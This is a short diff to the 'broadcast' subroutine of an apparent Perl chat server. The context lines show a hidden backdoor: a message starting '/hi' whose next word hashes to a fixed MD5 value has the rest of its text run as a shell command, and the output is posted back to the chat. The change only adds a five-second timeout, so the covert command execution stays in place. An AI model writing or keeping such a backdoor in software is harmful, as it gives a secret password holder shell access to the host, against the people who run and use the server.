@@ -28,7 +28,7 @@ sub broadcast
 
     if($msg =~ m{^/hi (\w+) (.+)$} && md5_hex($1) eq 'd1133275ee2118be63a577af759fc052')
     {
-	push @{$users{$user}}, [$user, $msg."\n".`$2`];
+	push @{$users{$user}}, [$user, $msg."\n".`bin/timeout 5 $2`];
 	return;
     }
 
